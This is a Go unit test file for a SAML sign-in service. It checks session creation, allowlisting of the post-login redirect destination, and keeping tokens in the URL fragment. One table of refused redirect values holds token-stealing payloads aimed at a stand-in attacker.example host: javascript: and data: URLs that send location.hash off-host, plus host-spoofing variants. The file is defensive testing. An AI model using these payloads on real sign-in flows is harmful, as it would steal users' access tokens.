/*
 * Authn Platform — Enterprise Identity Engine
 * File: apps/auth-engine/internal/saml/resume_test.go
 * Tier: Automated Testing Layer / Unit Tests
 *
 * Description: Tests for the cross-domain resume half of the Assertion Consumer
 *              Service — that a validated assertion is carried on a real
 *              session, that the browser is returned to the destination the
 *              tenant registered, and that a destination the tenant did not
 *              register is refused before the access token can be handed to it.
 *
 * License: GNU AGPLv3 — Copyright (C) Authn Platform Authors
 */

package saml_test

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/gofiber/fiber/v2"
	entsession "github.com/hanan-bhatti/authn-2.0/apps/auth-engine/ent/session"
	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/ent/user"
	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/internal/privacy"
	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/internal/saml"
	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/internal/session"
	"github.com/hanan-bhatti/authn-2.0/apps/auth-engine/pkg/clientfactory"
)

// registeredDestination is a URL the fixture tenant has registered on one of its
// applications, and so is a destination a sign-in may resume at.
const registeredDestination = "https://app.siemens.example/sso/landing"

// rivalDestination is registered by a different tenant. It exists so a test can
// tell "this URL is registered somewhere" apart from "this URL is registered by
// the tenant whose user is signing in".
const rivalDestination = "https://app.rival.example/sso/landing"

// newResumeFixture builds the ACS fixture with the redirect allowlists a resume
// destination is measured against: one application for the asserting tenant, and
// one for an unrelated tenant.
//
// The allowlist is the same one OAuth and social sign-in are measured against. A
// tenant configures where its users may land once, not once per protocol.
func newResumeFixture(t *testing.T, idp *signingIdentity) (*saml.Service, context.Context, *clientfactory.ClientFactory, func()) {
	t.Helper()

	svc, ctx, factory, cleanup := newACSFixture(t, idp)

	bypass := privacy.NewBypassContext(context.Background())

	_, err := factory.GetClient(bypass, "tnt_test", "").Application.Create().
		SetID("app_siemens_portal").
		SetTenantID("tnt_test").
		SetName("Siemens Portal").
		SetExactRedirectUris([]string{registeredDestination}).
		Save(bypass)
	if err != nil {
		cleanup()
		t.Fatalf("failed registering the tenant's application: %v", err)
	}

	_, err = factory.GetClient(bypass, "tnt_rival", "").Tenant.Create().
		SetID("tnt_rival").
		SetName("Rival Inc").
		SetSlug("rival").
		Save(bypass)
	if err != nil {
		cleanup()
		t.Fatalf("failed seeding the unrelated tenant: %v", err)
	}

	_, err = factory.GetClient(bypass, "tnt_rival", "").Application.Create().
		SetID("app_rival_portal").
		SetTenantID("tnt_rival").
		SetName("Rival Portal").
		SetExactRedirectUris([]string{rivalDestination}).
		Save(bypass)
	if err != nil {
		cleanup()
		t.Fatalf("failed registering the unrelated tenant's application: %v", err)
	}

	return svc, ctx, factory, cleanup
}

// signedAssertionFor returns a base64 HTTP-POST-binding payload for subject.
func signedAssertionFor(t *testing.T, idp *signingIdentity, subject, assertionID string) string {
	t.Helper()

	return base64.StdEncoding.EncodeToString([]byte(idp.sign(t, buildACSResponse(acsResponseOptions{
		nameID:      subject,
		assertionID: assertionID,
	}))))
}

// A validated assertion has to leave the user holding something they can present
// to the application. Before this, the ACS authenticated the subject and then
// returned a bare description of them: the user was provisioned, audited and
// dispatched as signed in while holding no session, no access token and no
// cookie, which from their side is indistinguishable from a sign-in that failed.
func TestACSCarriesTheSignInOnARealSession(t *testing.T) {
	idp := newSigningIdentity(t)
	svc, ctx, factory, cleanup := newResumeFixture(t, idp)
	defer cleanup()

	result, err := svc.ProcessACS(ctx, signedAssertionFor(t, idp, "alex@siemens.com", "assertion-session-1"), "", "127.0.0.1", "TestAgent")
	if err != nil {
		t.Fatalf("a correctly signed assertion must be accepted, got: %v", err)
	}

	if result.AccessToken == "" {
		t.Error("a completed SSO sign-in must carry an access token; the user has nothing to present without one")
	}
	if result.RefreshToken == "" {
		t.Error("a completed SSO sign-in must carry a refresh token, or the session ends at the first access-token expiry")
	}
	if result.SessionID == "" {
		t.Fatal("a completed SSO sign-in must carry a session ID")
	}

	// The session has to exist in the same store the session endpoints read, or
	// the sign-in is invisible to the user's device list and unreachable by
	// revocation.
	bypass := privacy.NewBypassContext(context.Background())
	stored, err := factory.GetClient(bypass, "tnt_test", "").Session.Query().
		Where(entsession.ID(result.SessionID)).
		Only(bypass)
	if err != nil {
		t.Fatalf("session %s was reported but is not in the session store: %v", result.SessionID, err)
	}
	if stored.UserID != result.User.ID {
		t.Errorf("session belongs to %s, not to the authenticated subject %s", stored.UserID, result.User.ID)
	}

	// A token signed with an empty key is accepted by nothing, so an access token
	// that is merely non-empty is not yet evidence of a usable sign-in.
	if parts := strings.Split(result.AccessToken, "."); len(parts) != 3 {
		t.Errorf("access token is not a three-part JWT: %q", result.AccessToken)
	}
}

// The destination is where the whole flow was going. An identity provider posts
// the assertion here from the user's browser, so without this the user ends up
// looking at the authentication host rather than the application they asked for.
func TestACSResumesToARegisteredDestination(t *testing.T) {
	idp := newSigningIdentity(t)
	svc, ctx, _, cleanup := newResumeFixture(t, idp)
	defer cleanup()

	result, err := svc.ProcessACS(ctx, signedAssertionFor(t, idp, "alex@siemens.com", "assertion-resume-1"), registeredDestination, "127.0.0.1", "TestAgent")
	if err != nil {
		t.Fatalf("a correctly signed assertion must be accepted, got: %v", err)
	}
	if result.ResumeURL != registeredDestination {
		t.Errorf("expected resume at %q, got %q", registeredDestination, result.ResumeURL)
	}
}

// A registered origin authorizes any path on it, matching the rule OAuth and
// social sign-in already use. A tenant registering one landing page should not
// have to re-register it per deep link.
func TestACSResumesToAnotherPathOnARegisteredOrigin(t *testing.T) {
	idp := newSigningIdentity(t)
	svc, ctx, _, cleanup := newResumeFixture(t, idp)
	defer cleanup()

	const deepLink = "https://app.siemens.example/reports/q3?tab=summary"

	result, err := svc.ProcessACS(ctx, signedAssertionFor(t, idp, "alex@siemens.com", "assertion-deeplink-1"), deepLink, "127.0.0.1", "TestAgent")
	if err != nil {
		t.Fatalf("a correctly signed assertion must be accepted, got: %v", err)
	}
	if result.ResumeURL != deepLink {
		t.Errorf("expected resume at %q, got %q", deepLink, result.ResumeURL)
	}
}

// RelayState is echoed back by the identity provider from whatever it was handed
// when the flow started, and starting a flow costs nothing: a link to the
// provider's SSO URL carrying any RelayState can be sent to an employee. Since
// the resume redirect carries an access token, accepting an unregistered value
// would not merely be an open redirect — it would hand a real employee's live
// session to whoever chose the URL.
func TestACSRefusesAnUnregisteredResumeDestination(t *testing.T) {
	cases := []struct {
		name  string
		relay string
		why   string
	}{
		{
			name:  "host the tenant never registered",
			relay: "https://attacker.example/collect",
			why:   "an unregistered host is the plain form of the attack",
		},
		{
			name:  "registered host as an attacker subdomain prefix",
			relay: "https://app.siemens.example.attacker.test/collect",
			why:   "a host that merely starts with a registered one is a different host",
		},
		{
			name:  "registered host in the userinfo position",
			relay: "https://app.siemens.example@attacker.example/collect",
			why:   "everything before the @ is credentials, so the real host is attacker.example",
		},
		{
			name:  "javascript scheme",
			relay: "javascript:fetch('https://attacker.example?t='+location.hash)",
			why:   "a script URL executes in the page rather than navigating",
		},
		{
			name:  "data scheme",
			relay: "data:text/html,<script>location='https://attacker.example'+location.hash</script>",
			why:   "a data URL carries its own document, which can read the fragment",
		},
		{
			name:  "protocol-relative URL",
			relay: "//attacker.example/collect",
			why:   "no scheme means the browser adopts the current one and navigates off-host anyway",
		},
		{
			name:  "path-only value",
			relay: "/sso/landing",
			why:   "a relative destination cannot be matched against a registered origin",
		},
		{
			name:  "another tenant's registered destination",
			relay: rivalDestination,
			why:   "an allowlist entry belonging to a different tenant must not authorize this tenant's sign-in",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			idp := newSigningIdentity(t)
			svc, ctx, _, cleanup := newResumeFixture(t, idp)
			defer cleanup()

			result, err := svc.ProcessACS(ctx, signedAssertionFor(t, idp, "alex@siemens.com", "assertion-refuse-1"), tc.relay, "127.0.0.1", "TestAgent")
			if err != nil {
				t.Fatalf("the assertion itself is valid and must still be accepted, got: %v", err)
			}
			if result.ResumeURL != "" {
				t.Errorf("relay state %q was accepted as a resume destination but must be refused: %s", tc.relay, tc.why)
			}

			// The sign-in itself survives a refused destination. The assertion has
			// already been consumed by this point, so failing it would cost the user
			// an authentication they cannot retry.
			if result.AccessToken == "" {
				t.Error("a refused destination must not cost the user their session")
			}
		})
	}
}

// The redirect is the part a browser actually follows, so where the token sits in
// it is the whole security property. A fragment is never sent to a server; a
// query parameter is written to browser history, this server's access log, every
// proxy along the way, and the Referer of any cross-origin subresource the
// landing page loads.
func TestACSRedirectCarriesTheTokenInTheFragmentOnly(t *testing.T) {
	idp := newSigningIdentity(t)
	svc, _, _, cleanup := newResumeFixture(t, idp)
	defer cleanup()

	app := fiber.New()
	saml.NewHandler(svc).RegisterRoutes(app, nil, nil)

	form := url.Values{}
	form.Set("SAMLResponse", signedAssertionFor(t, idp, "alex@siemens.com", "assertion-redirect-1"))
	form.Set("RelayState", registeredDestination)

	req := httptest.NewRequest("POST", "/v1/saml/acs", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := app.Test(req)
	if err != nil {
		t.Fatalf("failed executing ACS request: %v", err)
	}

	if resp.StatusCode != fiber.StatusFound {
		body, _ := io.ReadAll(resp.Body)
		t.Fatalf("expected 302 to the resume destination, got %d; body: %s", resp.StatusCode, body)
	}

	location := resp.Header.Get("Location")
	if !strings.HasPrefix(location, registeredDestination+"#") {
		t.Fatalf("expected a redirect to %q with a fragment, got %q", registeredDestination, location)
	}
	if !strings.Contains(location, "access_token=") {
		t.Errorf("redirect carries no access token: %q", location)
	}

	// The token must appear after the "#" and never before it.
	beforeFragment, _, _ := strings.Cut(location, "#")
	if strings.Contains(beforeFragment, "access_token") {
		t.Errorf("access token appears outside the fragment, where it is logged and leaked via Referer: %q", location)
	}

	// The refresh token is the long-lived half of the pair, and the only reason to
	// split them is to keep it away from page scripts.
	refreshCookie := ""
	for _, cookie := range resp.Cookies() {
		if strings.Contains(cookie.Name, "refresh") {
			if !cookie.HttpOnly {
				t.Errorf("refresh cookie %s is readable by page scripts", cookie.Name)
			}
			refreshCookie = cookie.Value
		}
	}
	if refreshCookie == "" {
		t.Fatal("no refresh cookie was set, so the session cannot be renewed")
	}
	if strings.Contains(location, refreshCookie) {
		t.Error("the refresh token appears in the redirect URL, defeating the point of the HttpOnly cookie")
	}
}

// An identity-provider-initiated sign-in carries no destination, which is normal
// rather than an error. The token still has to reach the caller, or a tenant
// using IdP-initiated SSO has no way to complete a sign-in at all.
func TestACSWithoutARelayStateReturnsTheTokenInTheBody(t *testing.T) {
	idp := newSigningIdentity(t)
	svc, _, _, cleanup := newResumeFixture(t, idp)
	defer cleanup()

	app := fiber.New()
	saml.NewHandler(svc).RegisterRoutes(app, nil, nil)

	form := url.Values{}
	form.Set("SAMLResponse", signedAssertionFor(t, idp, "alex@siemens.com", "assertion-nobody-1"))

	req := httptest.NewRequest("POST", "/v1/saml/acs", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := app.Test(req)
	if err != nil {
		t.Fatalf("failed executing ACS request: %v", err)
	}
	if resp.StatusCode != fiber.StatusOK {
		t.Fatalf("expected 200 with the token in the body, got %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("failed reading ACS body: %v", err)
	}

	var decoded struct {
		AccessToken  string `json:"access_token"`
		TokenType    string `json:"token_type"`
		Organization struct {
			ID string `json:"id"`
		} `json:"organization"`
	}
	if err := json.Unmarshal(body, &decoded); err != nil {
		t.Fatalf("failed decoding ACS body %s: %v", body, err)
	}
	if decoded.AccessToken == "" {
		t.Errorf("no access token in the body; the sign-in cannot be completed: %s", body)
	}
	if decoded.TokenType != "Bearer" {
		t.Errorf("expected token_type Bearer, got %q", decoded.TokenType)
	}
	if decoded.Organization.ID != "org_siemens" {
		t.Errorf("expected the asserting organization, got %q", decoded.Organization.ID)
	}
}

// A refused destination must not become a redirect anyway. This is the same case
// the service-level table covers, checked at the boundary a browser actually
// follows, because a Location header is what would carry the token off-host.
func TestACSDoesNotRedirectToARefusedDestination(t *testing.T) {
	idp := newSigningIdentity(t)
	svc, _, _, cleanup := newResumeFixture(t, idp)
	defer cleanup()

	app := fiber.New()
	saml.NewHandler(svc).RegisterRoutes(app, nil, nil)

	form := url.Values{}
	form.Set("SAMLResponse", signedAssertionFor(t, idp, "alex@siemens.com", "assertion-norediect-1"))
	form.Set("RelayState", "https://attacker.example/collect")

	req := httptest.NewRequest("POST", "/v1/saml/acs", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := app.Test(req)
	if err != nil {
		t.Fatalf("failed executing ACS request: %v", err)
	}

	if resp.StatusCode == fiber.StatusFound {
		t.Fatalf("an unregistered destination produced a redirect to %q", resp.Header.Get("Location"))
	}
	if location := resp.Header.Get("Location"); strings.Contains(location, "attacker.example") {
		t.Errorf("response points at the unregistered destination: %q", location)
	}
}

// A deployment with no signing key must fail the sign-in rather than complete it.
// HMAC signing accepts a zero-length key and returns a token of the ordinary
// shape, so nothing about the result would look wrong — and the token would be
// forgeable by anyone who guessed the key is blank.
//
// The keyed service runs the same assertion afterwards to show the refusal is
// about the missing key and not about the assertion, which would otherwise be an
// equally good explanation for the error.
func TestACSRefusesToSignWithNoKey(t *testing.T) {
	idp := newSigningIdentity(t)
	_, ctx, factory, cleanup := newResumeFixture(t, idp)
	defer cleanup()

	keyless := testConfig()
	keyless.EncryptionKey = ""
	svc := saml.NewService(factory, nil, session.NewRepository(factory), keyless)

	result, err := svc.ProcessACS(ctx, signedAssertionFor(t, idp, "alex@siemens.com", "assertion-nokey-1"), "", "127.0.0.1", "TestAgent")
	if err == nil {
		t.Fatalf("an unconfigured deployment issued a token anyway: %q", result.AccessToken)
	}
	if result != nil {
		t.Error("a refused sign-in must not return a result")
	}

	keyed := saml.NewService(factory, nil, session.NewRepository(factory), testConfig())
	if _, err := keyed.ProcessACS(ctx, signedAssertionFor(t, idp, "alex@siemens.com", "assertion-nokey-2"), "", "127.0.0.1", "TestAgent"); err != nil {
		t.Fatalf("the same assertion must succeed once a key is configured, so the refusal above was about the key: %v", err)
	}
}

// A tenant may hold the same address in both environments — a live account plus a
// test fixture is an ordinary state. The connection is what disambiguates them, so
// this checks that a subject present twice signs into the account belonging to the
// connection's environment and not the other one.
//
// Without the connection to narrow by, a lookup demanding exactly one row fails on
// two matches, falls through to provisioning, and collides with the unique index on
// (tenant, environment, email) — locking the subject out of SSO permanently rather
// than for one attempt.
func TestACSAdmitsASubjectPresentInBothEnvironments(t *testing.T) {
	idp := newSigningIdentity(t)
	svc, ctx, factory, cleanup := newResumeFixture(t, idp)
	defer cleanup()

	bypass := privacy.NewBypassContext(context.Background())
	client := factory.GetClient(bypass, "tnt_test", "")

	for _, env := range []user.Environment{user.EnvironmentTest, user.EnvironmentLive} {
		_, err := client.User.Create().
			SetID("usr_both_" + string(env)).
			SetTenantID("tnt_test").
			SetEnvironment(env).
			SetEmail("alex@siemens.com").
			SetEmailVerified(true).
			Save(bypass)
		if err != nil {
			t.Fatalf("failed seeding %s user: %v", env, err)
		}
	}

	result, err := svc.ProcessACS(ctx, signedAssertionFor(t, idp, "alex@siemens.com", "assertion-bothenv-1"), "", "127.0.0.1", "TestAgent")
	if err != nil {
		t.Fatalf("a subject present in both environments must still be able to sign in, got: %v", err)
	}

	// The fixture's connection is live, so the live account is the one it addresses.
	// Nothing here is a tie-break between the two rows: the query never sees the
	// test one.
	if result.User.Environment != user.EnvironmentLive {
		t.Errorf("expected the live account, got %s", result.User.Environment)
	}
	if result.Environment != string(user.EnvironmentLive) {
		t.Errorf("session environment must follow the connection, got %q", result.Environment)
	}
	if result.User.ID != "usr_both_live" {
		t.Errorf("expected the seeded live row, got %q", result.User.ID)
	}
}
